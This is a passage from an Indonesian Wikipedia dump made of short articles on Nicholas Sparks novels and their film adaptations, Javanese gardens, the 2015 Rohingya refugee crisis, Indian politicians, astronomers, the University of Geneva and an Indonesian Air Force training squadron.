John Tyree, pemuda pemberontak yang memilih menjadi tentara karena tidak memiliki tujuan hidup, sampai ia bertemu Savannah Lynn Curtis. Hubungan yang berawal dari percintaan musim panas berubah menjadi cinta abadi, membuat Savannah rela menunggu John untuk menyelesaikan tugasnya, yang berjanji akan pulang dan menikahinya. Tapi tak satu pun menyangka akan terjadi peristiwa 9/11 di New York yang mengubah dunia dan cinta mereka. Pada saat itu, sebagai tentara, John merasa menjadi tugasnya untuk mendaftar ulang. Dan sayangnya, perpisahan yang lama membuat Savannah jatuh cinta dengan orang lain. "Dear John", demikian surat itu dimulai. Dan dari dua kata itu, ada hati yang patah dan dua anak manusia yang hidupnya berubah selamanya. Kembali ke tempat asalnya, John datang dan memahami fakta bahwa Savannah, yang sekarang sudah menikah, masih menjadi cinta sejatinya dan menghadapi keputusan tersulit dalam hidupnya.


Film adaptasi dari novel "Dear John" dirilis pada tanggal 5 Februari 2010 di Amerika Serikat. Film ini disutradarai oleh Lasse Hallström dan diproduseri oleh Marty Bowen, Wyck Godfrey, dan Ryan Kauvanaugh. Naskah dari film ini ditulis oleh Jamie Linden. Film ini dibintangi oleh Channing Tatum sebagai John Tyree, Amanda Seyfried sebagai Savannah Lynn Curtis, Henry Thomas sebagai Tim Wheddon (tetangga dan suami Savannah), Scott Porter sebagai Randy (teman Savannah), dan Richard Jenkins sebagai Bill Tyree (ayah John Tyree).



</doc>
<doc id="1757323" url="https://id.wikipedia.org/wiki?curid=1757323" title="The Lucky One (novel)">
The Lucky One (novel)

The Lucky One adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan Oktober 2008 oleh penerbit Grand Central Publishing di Amerika Serikat. Novel ini berlatar tempat di Hampton, Carolina Utara.

Ketika Marinir Amerika Serikat Logan Thibault menemukan foto wanita muda yang tersenyum, yang setengah terkubur di tanah selama tur ketiga dalam tugas di Irak, insting pertamanya adalah melemparnya. Sebaliknya, ia membawanya kembali ke markas mencari pemilik foto itu, tetapi ketika tidak ada yang mengakuinya, ia menemukan dirinya selalu membawa foto di sakunya. Logan mengalami peristiwa beruntun, menang permainan poker dan bahkan selamat dalam pertempuran mematikan, yang membunuh dua rekannya. Hanya sahabatnya, Victor, yang tampaknya memiliki penjelasan untuk nasib baik Logan: foto itu adalah tanda keberuntungan. Kembali ke rumah di Colorado, Logan tidak bisa melupakan foto dan wanita itu dari pikirannya. Percaya bahwa ia entah bagaimana memegang kunci untuk takdirnya, ia mencari informasi di internet untuk menemukannya, tidak pernah mengharapkan wanita yang kuat tetapi rentan yang ia temui di Hampton, Carolina Utara. Adalah Elizabeth Green, seorang janda satu anak, menjadi gadis yang ditunggu seluruh hidupnya untuk bertemu. Tertangkap basah oleh daya tarik yang dirasakan, Logan menyembunyikan cerita dari foto itu, dan keberuntungannya, secara rahasia. Saat ia dan Elizabeth memulai gairah dan cinta, rahasia yang ditutup rapat akan segera terancam, memisahkan mereka, menghancurkan tidak hanya cinta mereka, tetapi juga kehidupan mereka.


Film adaptasi dari novel "The Lucky One" dirilis pada tanggal 19 April 2012 di Amerika Serikat. Film ini disutradarai oleh Scott Hicks dan diproduseri oleh Denise Di Novi dan Kevin McCormick. Naskah dari film ini ditulis oleh Will Fetters. Film ini dibintangi oleh Zac Efron sebagai Logan Thibault, Taylor Schilling sebagai Beth Green, Blythe Danner sebagai Ellie (nenek Beth Green, namun di dalam novel, menjadi ibu Beth bernama Nana), dan Jay R. Ferguson sebagai Keith Clayton (mantan suami Beth Green).



</doc>
<doc id="1757533" url="https://id.wikipedia.org/wiki?curid=1757533" title="Taman Jawa">
Taman Jawa

Taman Jawa atau Javanese Garden adalah Taman Khas Jawa yaitu taman yang dibangun dengan tema gaya tradisional Jawa. Prinsip dasar taman Jawa adalah miniaturisasi dari lanskap atau pemandangan alam tropis di Jawa. Elemen dasar seperti batu-batu dan kolam dipakai untuk melambangkan lanskap alam berukuran besar.

Taman Jawa dahulunya di bangun di areal keraton, dan yang diperbolehkan masuk hanya keluarga Raja. Kini taman Jawa yang dibuka untuk umum, konsep taman Jawa kini dibangun di hotel, kantor, di taman kota, dan di rumah masyarakat.

Taman dalam bahasa Jawa adalah "Pasren", asal usul kata pasren terdiri dari kata asri yang berarti indah. Mendapat awalan ‘pa’ dan akhiran ‘an’. Sehingga di rangkai menjadi ‘pa + asri + an’. Jadi artinya suatu tempat yang banyak keindahan. Taman Jawa yang terdiri dari sebuah ruangan yang terdapat bangunan pendopo, kolam, serta dilengkapi dengan bangunan berbentuk punden berundak terbuat dari batu, dan pohon yang di keramatkan seperti pohon bambu kuning, pohon beringin, pohon bunga kantil, dan yang lainnya. Umumnya taman Jawa dibuat menurut selera pribadi, yang menuntut suasana tenang dan asri, menjadikannya sebagai tempat untuk bertafakur, introspeksi dan istirahat. Taman Jawa mementingkan makna dan hitungan Jawa kuno.

Taman klasik Jawa bentuk taman umumnya terdapat air, simetris, dan alami lalu ditambahkan bangunan buatan manusia seperti punden berundak, kolam pemandian keluarga raja. Fungsi bangunan berguna sebagai kerangka atau menambahkan kecantikan pemandangan dan juga sebagai dekorasi. Bangunan-bangunan yang ditemukan di taman Jawa antara lain Balai, Pendopo, Segaran, Dwarapala, Paduraksa, Candi bentar, dan punden berundak.

Taman Jawa terdapat tanaman bunga yang khas dan harus ada di Taman Jawa, yaitu:
bunga mawar merah mempunyai makna kelahiran diri manusia ke dunia
bunga mawar putih mempunyai makna ketentraman, sejahtera, dan damai
bunga kantil memiliki makna jiwa spiritual yang kuat untuk meraih sukses lahir maupun batin
bunga melati memiliki makna dalam melakukan tidakan selalu melibatkan hati (kalbu), tidak semerta merta melakukan
bunga kenanga memiliki makna generasi penerus leluhur
bunga sedap malam memiliki makna keharmonisan dan ketentraman
bunga melati gambir memiliki makna Kesederhanaan

Taman Jawa terdapat pepohonan yang khas dan harus ada di Taman Jawa, yaitu:
Sawo Kecik (Manilkara kauki) sering disebut juga Sawo Jawa merupakan tanaman (pohon) penghasil buah dari keluarga sawo-sawoan (Sapotaceae) yang kini mulai langka dan jarang ditemukan di Indonesia. Sawo Kecik yang menurut filosofi Jawa sering diidentikkan dengan sarwo becik (serba baik). Di Yogyakarta kadang dijadikan tanaman pertanda bahwa orang yang menanamnya adalah abdi dalem kraton.
Kepel adalah nama pohon dan buah yang mempunyai nama ilmiah Stelechocarpus burahol. Tumbuhan penghasil buah yang menjadi kegemaran para putri keraton Jawa sejak jaman dulu ini kini termasuk salah satu tanaman langka di Indonesia. Pohon Kepel menjadi kegemaran para putri keraton di Jawa selain lantaran memiliki nilai filosofi sebagai perlambang kesatuan dan keutuhan mental dan fisik, buah kepel juga dipercaya mempunyai berbagai khasiat dibidang kecantikan. Buah Kepel telah menjadi deodoran (penghilang bau badan) bagi para putri keraton. Sayang justru karena itu masyarakat jelata tidak berani menanam pohon ini sehingga menjadi langka.
Pohon beringin punya filosofi kokoh kuat dan mengayomi. Beringin tidak tumbuh ke atas namun tumbuhnya melebar, mengembang dan terkadang kembali ke bawah menjuntai . Itu juga berarti orang harus mengenal asal usulnya.. darimana dia berasal. Pun pohon beringin selalu menjernihkan mata air yang ada di sekitarnya.Tanaman beringin memiliki kemampuan sebagai tanaman konservasi mata air dan penguat lereng alami. Hal tersebut dapat dilihat dari struktur perakarannya yang dalam dan akar lateral yang mencengkeram tanah dengan baik. Selain itu, jenis-jenis beringin memang diketahui sebagai habitat beberapa burung, reptilian, serangga dan mamalia yang mengkonsumsi buahnya. Jadi, dengan menanam beringin, secara tidak langsung juga akan mengkonservasi fauna yang menjadikan beringin sebagai tempat hidupnya.
Beringin merupakan tanaman yang memiliki kemampuan hidup dan beradaptasi dengan bagus pada berbagai kondisi lingkungan. Selain itu keberadaan tanaman beringin pada kawasan hutan bisa dijadikan sebagai indikator proses terjadinya suksesi hutan. Beringin juga merupakan tanaman yang memiliki umur sangat tua, tanaman tersebut dapat hidup dalam waktu hingga ratusan tahun. Pohon beringin sangat identik dengan segala sesuatu yang berbau mistis. Banyak orang menganggap pohon besar ini suci dan tempat kekuatan magis berkumpul. Tak jarang pula orang yang berpikir kalau lokasi di sekitar pohon beringin adalah tempat yang angker. Namun, dibalik semua rahasia yang tersimpan, pohon ini ternyata memiliki manfaat besar dalam menyembuhkan sejumlah penyakit.
Pohon Bambu tak hanya menarik ketika ditata untuk menghias taman. Pohon berbatang ramping itu juga mengandung filosofi hidup yang berguna untuk manusia. Kita dapat menjumpai pohon bambu dengan murah di sekitar lingkungan. Penampakannya sangat khas, rimbun berumpun dengan batang yang panjang serta daun yang bentuknya mirip rumput. Saat angin berembus, suara dari gesekan daun bambu memancarkan ciri tersendiri. Pohon yang dapat menyejukkan taman rumah ini menyimpan filosofi yang bisa jadi belum diketahui banyak orang. Bambu, yang perubahan wujudnya terbilang lambat, sebetulnya memiliki kekuatan pada akar. Satu hingga tiga tahun, pertumbuhan pohon ini dirasa lambat.

Umbul-umbul berbentuk bendera dengan lebar sempit, dan mempunyai panjang empat sampai lima meter meruncing ke atas. Umbul umbul melekat dengan sisi panjang tiang bambu, atas dibengkokkan ke bawah. Di Jawa Umbul-umbul adalah simbol penanda ada upacara perayaan dan merupakan elemen penting dari perayaan, upacara dan festival Islam yang dapat ditemukan di hampir semua Masjid dalam acara pengajian, ramadhan, lebaran. Juga dalam acara budaya seperti pada upacara Sedekah Bumi, festival, dan lain-lain.
Secara tradisional umbul-umbul hanya terdiri satu warna[4] . Setiap warna memiliki makna khusus mereka tergantung pada jenis upacara, warna lain yang digunakan. yaitu:

Makna simbolis yang terkandung dalam Janur Kuning melengkung yang berada di pintu gerbang sang tuan rumah pemilik hajat. Kata Janur sendiri, berasal dari kiratha basa Jawa (Othak-athik mathuk), sejane neng nur (arahnya menggapai nur=cahaya Ilahi). Sedangkan kata kuning bermakna sabda dadi (kun fayaku-Nya Allah SWT) yang dihasilkan dari hati atau jiwa yang bening. Dengan demikian, janur kuning mengisyaratkan cita-cita mulia dan tinggi untuk menggapai cahaya Ilahi dengan dibarengi hati yang bening. Tampak betapa tingginya filosofi janur kuning dalam prosesi upacara tradisi di Jawa.
Kini janur kuning itu sendiri adalah perlambang suatu prosesi sebuah acara resmi masyarakat adat dan agama, oleh sebab itu berbagai model janur kuning bisa ditemui, sesuai kebutuhan dari acara tersebut. Sebut saja Model Janur Tonjor-tonjor ala Keraton, atau Janur Kuning untaian dari besar hingga kecil memanjang tinggi. Untuk model Janur akan di tentukan oleh yang punya hajat karena semakin banyak Janur Kuning dan semakin besar akan menunjukan semakin tinggi status social di masyarakat karena kemeriahan akan menunjukan kelas ekonomi mereka di masyarakat.

Bleketepe terbuat dari daun kelapa yang masih hijau dan dianyam dengan ukuran rata-rata 50 cm x 200 cm. Bleketepe yang dipasang di tarub dan mengelilingi area untuk pernikahan ataupun suatu even, merupakan perwujudan dari suatu tempat penyucian di kahyangan para dewa yang dinamakan Bale Katapi.
"Bale" artinya tempat, "Katapi" dari kata tapi yang berarti membersihkan dan memilahkan kotoran-kotoran untuk kemudian dibuang. Dengan demikian pemasangan bleketepe dapat diartikan secara luas sebagai ajakan pemilik hajat kepada semua orang yang terlibat di dalam upacara hajatan untuk berproses bersama menyucikan hati.

Pohon air warna adalah plastik bening yang di isi air berwarna-warni kemudian di gantungkan pada ranting pohon di taman depan rumah, baik dipasang pada depan pintu, maupun di pasang pada halaman depan rumah. Pohon Air Warna tersebut dahulunya sebagai penolak bala, namun sekarang plastik air warna tersebut digunakan sebagai ornamen untuk memeriahkan suatu acara.

Candi bentar adalah sebutan bagi bangunan gapura berbentuk dua bangunan serupa dan sebangun tetapi merupakan simetri cermin yang membatasi sisi kiri dan kanan pintu masuk. Candi bentar tidak memiliki atap penghubung di bagian atas, sehingga kedua sisinya terpisah sempurna, dan hanya terhubung di bagian bawah oleh anak tangga.

Paduraksa adalah bangunan berbentuk gapura yang memiliki atap penutup, yang lazim ditemukan dalam arsitektur kuno dan klasik di Jawa dan Bali. Kegunaan bangunan ini adalah sebagai pembatas sekaligus gerbang akses penghubung antarkawasan dalam kompleks bangunan khusus

Kala berfungsi sebagai elemen dekoratif umum pada gerbang masuk dan dinding

Retjo Pentung atau Dwarapala diletakkan di pintu gerbang masuk ke Istana, Rumah, dan Taman. Dwarapala adalah patung penjaga gerbang atau pintu, berbentuk manusia atau raksasa yang memegang gada. Hutan di daerah Tulungagung dahulunya terdapat mahluk asral yang berbentuk besar seperti raksasa dan mahluk astral tersebut merupakan positif, karena mahluk tersebut tidak mengganggu melainkan sebagai penjaga di hutan tersebut. Bagi istana, kantor kadipaten, rumah, taman, yang terdapat patung retjo pentung (Dwarapala) yaitu patung yang dibentuk menyerupai bentuk mahluk astral di hutan tulungagung, maka tempat yang ada patung retjo pentung akan di jaga oleh makhluk penjaga tersebut dari hal-hal yang tidak baik.. Dalam budaya Jawa, dwarapala (retjo pentung) dijadikan figur penjaga keraton, misalnya dapat ditemukan di gerbang masuk Keraton Yogyakarta dan gerbang Kamandungan Lor Keraton Surakarta. Patung seperti ini dibuat pada masa kerajaan Sukhothai dan Ayutthaya. Dalam budaya Jawa, dwarapala dijadikan figur penjaga keraton, misalnya dapat ditemukan di gerbang masuk Keraton Yogyakarta dan gerbang Kamandungan Lor Keraton Surakarta.

Umumnya ular naga Jawa dijadikan pola hias bentuk pipi tangga di kanan dan kiri tangga naik ke bangunan utama. Naga Jawa yang dibentuk sebagai badan dan kepala naga, mulut naga Jawa digambarkan terbuka lebar dan lidahnya menjulur keluar dalam wujud untaian manik-manik ataupun bentuk naga yang menganga dengan seekor singa di dalam mulutnya. Naga Jawa merupakan motif penting dalam arsitektur Jawa. Naga Jawa digambarkan sebagai sesosok mahluk sakti berbentuk ular raksasa yang tidak memiliki kaki meskipun adakala diwujudkan mempunyai kaki. Naga Jawa memakai badhog atau mahkota di atas kepalanya. Terkadang Naga Jawa digambarkan juga memakai perhiasan anting dan kalung emas.

Pendapa (atau dibaca pendopo dalam bahasa Jawa), pengejaan Jawa: "pendåpå", berasal dari kata mandapa dari bahasa Sanskerta yang artinya bangunan tambahan) adalah bagian bangunan yang terletak di muka bangunan utama. Sejumlah tipe bangunan rumah tradisional di Sumatra, Semenanjung Malaya (dan juga Indocina), Jawa, Bali, dan Pulau Kalimantan diketahui memiliki pendopo sebagai hal yang "wajib".
Struktur ini kebanyakan dimiliki rumah besar atau keraton, letaknya biasanya di depan dalem, bangunan utama tempat tinggal penghuni rumah. Masjid-masjid berarsitektur asli Nusantara, kerap kali juga memiliki pendopo.

Pendopo biasanya berbentuk bangunan tanpa dinding dengan tiang yang banyak. Fungsi utamanya adalah sebagai tempat menerima tamu. Namun, karena pendopo biasanya besar, bangunan ini difungsikan pula sebagai tempat pertemuan, latihan tari atau karawitan, rapat warga, dan sebagainya.

Gazebo merupakan suatu bangunan yang ada di taman, biasanya tiap sisinya terbuka karena sesuai dengan tujuan utamanya, gazebo merupakan tempat yang nyaman untuk menikmati taman. Dengan sisi yang terbuka, Anda yang sedang berada di dalamnya dapat menikmati pemandangan taman dengan lebih bebas juga dapat menikmati udara yang bertiup tanpa terhalang penutup pada tiap sisi.

Gazebo Jawa desain jawa tampak pada mahkota atap dan mahkota pojok yang ada di setiap sudut atap. tak hanya seperti desain gazebo Jepara desain gazebo inipun memiliki kelebihan yaitu terdapat angin-angin sehingga desain menjadi tampak lebih indah.

Punden berundak adalah bangunan teras bertingkat-tingkat meninggi yang menyandar di kemiringan lereng gunung. Punden berundak adalah ciri khas Jawa. Ukuran teras semakin mengecil ke atas, jumlah teras umumnya 3 dan di bagian puncak teras teratas berdiri altar-altar yang jumlahnya 3 altar (1 altar induk diapit dua altar pendamping di kanan-kirinya. Tangga naik ke teras teratas terdapat di bagian tengah punden berundak, terdapat kemungkinan dahulu di kanan kiri tangga tersebut berdiri deretan arca menuju ke puncak punden yang berisikan altar tanpa arca apapun. Dahulu Punden Berundak merupakan tempat untuk pemujaan, kini punden berundak modern tidak untuk pemujaan melainkan hanya untuk hiasan taman ataupun hiasan kolam.

Segaran adalah kolam terletak di taman Jawa yang berfungsi untuk mensucikan diri (mandi), untuk persediaan air, juga untuk menyeimbangkan alam.

Terdapat beberapa Taman Jawa dari masa lalu yang masih ada hingga sekarang, yaitu:
Kebun ini dibangun pada zaman Sultan Hamengku Buwono I (HB I) pada tahun 1758-1765/9. Awalnya, taman yang mendapat sebutan "The Fragrant Garden" ini memiliki luas lebih dari 10 hektare dengan sekitar 57 bangunan baik berupa gedung, kolam pemandian, jembatan gantung, kanal air, maupun danau buatan beserta pulau buatan dan lorong bawah air.
Sebagian pakar berpendapat bahwa candi ini merupakan petirtaan, tempat mandi keluarga raja,
merupakan sebuah pemandian suci. Dapat dilihat adanya sebuah kolam air berbentuk persegi yang airnya terjun dari batu karang di atasnya. Di dasar kolam ditemukan sebuah peti berceruk sembilan (peripih nawasanga) Di atas batu karang paling tinggi pernah ditemukan pahatan berbentuk Gunung Penanggungan yaitu sebuah puncak dikelilingi empat puncak lain.


</doc>
<doc id="1757839" url="https://id.wikipedia.org/wiki?curid=1757839" title="Krisis pengungsi Rohingya 2015">
Krisis pengungsi Rohingya 2015

Krisis pengungsi Rohingya 2015 adalah insiden migrasi ribuan orang Rohingya dari Myanmar dan Bangladesh, yang dijuluki sebagai 'orang perahu' oleh media internasional, ke negara-negara Asia Tenggara yakni Malaysia, Indonesia dan Thailand menggunakan perahu melalui perairan Selat Malaka dan Laut Andaman. Komisioner Tinggi Perserikatan Bangsa-Bangsa untuk Pengungsi memperkirakan sekitar 25,000 orang dimasukkan ke kapal dari Januari sampai Maret pada 2015 oleh para pedagang manusia. Terdapat klaim bahwa sekitar 100 orang meninggal di Indonesia, 200 orang di Malaysia, dan 10 orang di Thailand pada saat perjalanan mereka setelah para pedagang membawa mereka ke laut.

Perdana menteri Bangladesh Sheikh Hasina menyatakan bahwa migran ekonomi dari Bangladesh "sakit secara mental" dan berkata bahwa mereka lebih baik tinggal di Bangladesh.

Aung San Suu Kyi telah dikritik oleh media internasional karena sikap diamnya terhadap krisis pengungsi tersebut.



</doc>
<doc id="1757841" url="https://id.wikipedia.org/wiki?curid=1757841" title="Extrasolar Planets Encyclopaedia">
Extrasolar Planets Encyclopaedia

Extrasolar Planets Encyclopaedia adalah sebuah situs web astronomi. Situs web tersebut didirikan di Paris, Prancis di Observatorium Meudon oleh Jean Schneider pada Februari 1995,




</doc>
<doc id="1757843" url="https://id.wikipedia.org/wiki?curid=1757843" title="Harish Rawat">
Harish Rawat

Harish Rawat (; kelahiran 27 April 1948) adalah seorang politikus India yang menjadi Ketua Menteri Uttarakhand sejak Februari 2014. Lima kali menjadi anggota Parlemen India, Rawat adalah pemimpin partai Kongres Nasional India. Sebagai anggota Lok Sabha ke-15, Rawat sebelumnya menjabat sebagai Menteri Serikat Sumber Daya Air dalam kabinet Perdana Menteri Manmohan Singh. Ia juga bekerja sebagai Menteri Negara untuk Kementerian Urusan Parlementer, Kementerian Agribudaya, Kementerian Industri Pemprosesan Makanan (2011-2012) dan Kementerian Buruh dan Karyawan (2009-2011).

Harish Rawat lahir di desa Mohanari, dekat Chaunalia di distrik Almora yang kemudian menjadi bagian dari Provinsi-Provinsi Serikat (sekarang Uttarakhand), pada 27 April 1948 dalam sebuah keluarga Rajput dari pasangan Rajendra Singh Rawat dan Devki Devi. Ia mendapatkan gelar Sarjana Kesenian dan LL.B. dari Universitas Lucknow.

Dimulai di politik tingkat desa, dan setelah singgah sebagai anggota Serikat Dagang dan anggota Kongres Pemuda India selama beberapa tahun, ia bergabung dengan Parlemen India pada 1980 sebagai anggota Lok Sabha ke-7 dengan mengalahkan veteran PBJ Murli Manohar Joshi dari konstituensi parlementer Almora, disusul dengan Lok Sabha ke-8 dan 9th Lok Sabha ke-9. Ia menjadi kepala Sayap Sukarelawan Kongres, "Congress Seva Dal" sejak 1980.

Pada 2000, ia terpilih menjadi Presiden Komite Kongres Uttarakhand Pradesh (KKUP), dan masih menjabat sampai ia digantikan oleh Yashpal Arya. Pada 2002, ia terpilih sebagai anggota Rajya Sabha, dewan tinggi parlemen India.



</doc>
<doc id="1757845" url="https://id.wikipedia.org/wiki?curid=1757845" title="Aleksander Wolszczan">
Aleksander Wolszczan

Aleksander Wolszczan (kelahiran 29 April 1946 di Szczecinek, Polandia) adalah seorang astronom Polandia. Ia adalah penemu dari planet-planet ekstrasolar dan planet-planet pulsar pertama.

Wolszczan dididik di Polandia (ia meraih gelar MSc pada 1969 dan mendapatkan gelar PhD pada 1975 di Universitas Nicolaus Copernicus di Toruń). Pada 1982, ia berpindah ke A.S. untuk bekerja di universitas Cornell dan Princeton. Kemudian, ia menjadi profesor astronomi di Universitas Negara Bagian Pennsylvania, di mana ia sekarang mengajar kelas "Kehidupan di alam semesta". Dari 1994 sampai 2008, ia juga menjadi profesor di Universitas Nicolaus Copernicus di Toruń. Ia adalah anggota Akademi Ilmu Pengetahuan Polandia.





</doc>
<doc id="1757846" url="https://id.wikipedia.org/wiki?curid=1757846" title="The Last Song (novel)">
The Last Song (novel)

The Last Song adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan September 2009 oleh penerbit Grand Central Publishing di Amerika Serikat. Novel ini berlatar tempat di Wilmington, Carolina Utara.

Kehidupan remaja tujuh belas tahun Veronica "Ronnie" Miller berubah ketika orang tuanya bercerai dan ayahnya pindah dari New York ke Wilmington, Carolina Utara. Tiga tahun kemudian, ia masih marah dan terasing dari orang tuanya, terutama ayahnya, sampai ibunya memutuskan untuk membawa Ronnie dan adiknya, Jonah, menghabiskan musim panas di Wilmington dengan ayahnya. Ayah Ronnie, seorang mantan guru dan pianis konser, memiliki kehidupan yang tenang di kota pantai, teredam dalam menciptakan sebuah karya seni yang akan menjadi pokok dari sebuah gereja lokal. Kisah ini adalah kisah yang tak terlupakan tentang segudang cinta - cinta pertama, cinta antara orang tua dan anak-anak - yang menunjukkan, untuk sebuah novel Nicholas Sparks, banyak hubungan yang sangat terasa dapat mematahkan hati kita, dan menyembuhkan mereka.


Film adaptasi dari novel "The Last Song" dirilis pada tanggal 31 Maret 2010 di Amerika Serikat. Film ini disutradarai oleh Julie Anne Robinson dan diproduseri oleh Adam Shankman dan Jennifer Gibgot. Naskah dari film ini ditulis oleh Nicholas Sparks dan Jeff Van Wie. Film ini dibintangi oleh Miley Cyrus sebagai Veronica "Ronnie" Miller, Liam Hemsworth sebagai Will Blakelee, Greg Kinnear sebagai Steve Miller (ayah Ronnie Miller), Kelly Preston sebagai Kim Miller (ibu Ronnie Miller), dan Bobby Coleman sebagai Jonah Miller (adik Ronnie Miller).



</doc>
<doc id="1757848" url="https://id.wikipedia.org/wiki?curid=1757848" title="Daftar Ketua Menteri Puducherry">
Daftar Ketua Menteri Puducherry

Ketua Menteri Puducherry adalah ketua eksekutif wilayah persatuan India selatan Puducherry. Ia dipilih dan dilantik oleh Letnan Gubernur Puducherry. Sejak 17 Mei 2011, N. Rangaswamy dari Kongres N.R. Seluruh India telah menjadi Ketua Menteri Puducherry petahana.



</doc>
<doc id="1757849" url="https://id.wikipedia.org/wiki?curid=1757849" title="Raymond Lyttleton">
Raymond Lyttleton

Raymond Arthur Lyttleton FRS () adalah seorang astronom teoretikal dan matematikawan Britania.

Ia lahir di Oldbury, wilayah Worcestershire dan dididik di sekolah King Edward VI Five Ways di Birmingham, dari sana ia melanjutkan pendidikannya ke Clare College, Cambridge untuk mempelajari matematika, lulus pada 1933. Ia terpilih menjadi Fellow of St John's College pada 1937 dan terpilih menjadi pengajar dalam bidang matematikan pada tahun yang sama (sampai 1959). Ia menjadi Pembaca dalam bidang Astronomi Teoretikal dari 1959 sampai 1969.

Ia terpilih menjadi Fellow of the Royal Society pada 1955.

Ia menulis sejumlah buku:" The Comets and Their Origin" (1953), "The Stability of Rotating Liquid Masses" (1953), "The Modern Universe" {1956}, " Rival Theories of Cosmology" {1960}, " Man's View of the Universe" (1961), "Mysteries of the Solar System" (1968), " The Earth and its Mountains" (1982), "The Gold Effect" (1990). Pada 1956, ia membawakan sebuah serial televisi 5 bagian di B.B.C. yang berjudul "The Modern Universe"

Ia menikah dengan Meave Hobden di Poole pada 1939.



</doc>
<doc id="1757853" url="https://id.wikipedia.org/wiki?curid=1757853" title="Universitas Jenewa">
Universitas Jenewa

Universitas Genewa (, UNIGE) adalah sebuah universitas penelitian publik yang terletak di Jenewa, Swiss. Universitas tersebut didirikan pada 1559 oleh Yohanes Calvin, sebagai sebuah seminari teologi dan sekolah hukum. Universitas tersebut masih berfokus pada teologi sampai abad ke-17, ketika universitas tersebut menjadi pusat untuk beasiswa Pencerahan. Pada 1873, universitas tersebut menurunkan afiliasi keagamaannya dan secara resmi menjadi sekuler. Sekarang, universitas tersebut menjadi universitas terbesar kedua di Swiss berdasarkan jumlah muridnya. Pada 2009, Universitas Genewa merayakan peringatan pendiriannya ke-450.

UNIGE memiliki program-program dalam berbagai bidang namun memiliki program-program penelitian dan akademik dalam bidang hubungan internasional, hukum, astrofisika, astronomi, genetik (dengan catatan kontribusi untuk bidang ilmu pengetahuan planetarium, genetik, pengembangan psikologi, neurosains, dan teologi). Pada 2011, universitas tersebut meraih peringkat ke-73 di seluruh dunia menurut Academic Ranking of World Universities, dan ke-69 pada QS World University Rankings.

UNIGE adalah anggota Liga Universitas-Universitas Penelitian Eropa, Coimbra Group dan Asosiasi Universitas Eropa.



</doc>
<doc id="1757854" url="https://id.wikipedia.org/wiki?curid=1757854" title="Raman Singh">
Raman Singh

Raman Singh () adalah seorang politikus India dan Ketua Menteri negara bagian Chhattisgarh sejak 7 Desember 2003. Ia adalah anggota Bharatiya Janata Party.

Raman Singh lahir pada 15 Oktober 1952 dalam sebuah keluarga Rajput. Ayahnya bernama Vighnaharan Singh Thakur dan ibunya bernama Sudha Singh. Ia adalah dokter Pengobatan Ayurvedik dan menikah dengan Veena Singh. Putranya Abhishek adalah seorang teknisi mekamik terkualifikasi dan sekarang menjabat sebagai Anggota Parlemen dari konstituensi Rajnandgaon dan putrinya Asmita adalah seorang dokter bedah gigi yang telah melakukan praktik.

Raman Singh adalah anggota Rashtriya Swayamsevak Sangh.

Singh bergabung dengan Bharatiya Jan Sangh sebagai anggota pemuda dan menjadi presiden sayap pemuda di Kawardha pada 1976-77. Ia menjadi kanselir munisipalitas Kawardha pada 1983.

Ia terpilih pada Mahkamah Legislatif Madhya Pradesh pada 1990 dan 1993. Pada 1999, ia terpilih pada Lok Sabha ke-13 dari konstituensi Rajnandgaon di Chhattisgarh. Dalam pemerintahan Atal Bihari Vajpayee, Singh menjadi Menteri Serikat Komerial dan Industri Negara Bagian dari 1999 sampai 2003. Ia kemudian menjadi Presiden Partai Bharatiya Janata (PBJ) di negara bagian Chhattisgarh yang baru dibentuk, dan membawa partai tersebut pada sebuah kemenangan dalam pemilihan Mahkamah negara bagian 2003.

Ia berhasil memenangkan pemilihan 2013 untuk masa jabatan ke-3nya sebagai KM Chhattisgarh.



</doc>
<doc id="1757855" url="https://id.wikipedia.org/wiki?curid=1757855" title="Safe Haven (novel)">
Safe Haven (novel)

Safe Haven (terjemahan bahasa Indonesia: Suaka Cinta) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan September 2010 oleh penerbit Grand Central Publishing di Amerika Serikat dan Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di New Bern, Carolina Utara.

Ketika seorang wanita muda misterius bernama Katie muncul di kota Southport, Carolina Utara, kedatangannya yang tiba-tiba menimbulkan pertanyaan tentang masa lalunya. Cantik dan menonjolkan diri, Katie tampaknya ingin menghindari hubungan pribadi hingga serangkaian kejadian menariknya ke dua hubungan: satu dengan Alex, seorang pemilik toko dengan hati yang baik dan berstatus duda dua anak; dan dengan tetangga yang lugas, Jo. Meskipun ia canggung, Katie perlahan mulai membaur dengan masyarakat dan semakin dekat dengan Alex dan anak-anaknya. Namun, saat Katie mulai jatuh cinta, ia berusaha melupakan rahasia gelap yang masih menghantui dan menakutkan dirinya, masa lalu yang membuatnya takut, melakukan pelarian ke tempat berlindung di Southport. Dengan dukungan Jo yang empatik dan keras kepala, Katie akhirnya menyadari bahwa ia harus memilih antara keselamatan hidupnya yang beresiko, dan bahwa disaat yang paling gelap, cinta adalah satu-satunya tempat yang benar-benar aman.


Film adaptasi dari novel "Safe Haven" dirilis pada tanggal 14 Februari 2013 di Amerika Serikat. Film ini disutradarai oleh Lasse Hallström dan diproduseri oleh Marty Bowen, Chad Freet, Wyck Godfrey, dan Ryan Kavanaugh. Naskah dari film ini ditulis oleh Gage Lansky dan Dana Stevens. Film ini dibintangi oleh Julianne Hough sebagai Katie Feldman/Erin Tierney, Josh Duhamel sebagai Alex Wheatley, Cobie Smulders sebagai Jo (tetangga Katie, mantan istri Alex, meninggal karena sakit), dan David Lyons sebagai Kevin Tierney (suami Katie).



</doc>
<doc id="1757859" url="https://id.wikipedia.org/wiki?curid=1757859" title="Skadron Pendidikan 403">
Skadron Pendidikan 403

Skadron Pendidikan 403 disingkat (Skadik 403) adalah Komando Pendidikan TNI Angkatan Udara yang berada di bawah kendali Komando Pembinaan Doktrin, Pendidikan dan Latihan TNI Angkatan Udara, dan bertugas menyelenggarakan Sekolah Pertama Bintara (Semaba) dan Sekolah Pembentukan Bintara (Setukba) TNI Angkatan Udara. yang bermarkas Lanud Adi Soemarmo, Surakarta, Jawa Tengah.


</doc>
<doc id="1757862" url="https://id.wikipedia.org/wiki?curid=1757862" title="Typhoon Weapon Station">
Typhoon Weapon Station

